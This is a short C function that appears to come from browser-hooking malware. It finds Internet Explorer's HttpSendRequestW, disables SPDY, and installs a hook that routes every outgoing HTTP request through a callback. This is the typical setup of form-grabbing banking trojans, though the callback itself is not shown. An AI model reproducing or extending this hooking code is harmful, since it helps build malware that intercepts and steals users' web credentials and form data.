VOID InternetExplorerEntry()
{
	RtlSecureZeroMemory(&sINTERNETEXPLORERMETHODS,sizeof(INTERNETEXPLORERMETHODS));
	sINTERNETEXPLORERMETHODS.HttpSendRequestW = FindHTTPSendRequestW();

	IEDISABLESPDY();

	if (sINTERNETEXPLORERMETHODS.HttpSendRequestW)
	{
		HTTPSENDREQUESTW = (PHTTPSENDREQUESTW)SetHook(INTERNETEXPLORERCALLBACK,(LPVOID)sINTERNETEXPLORERMETHODS.HttpSendRequestW);
	}
}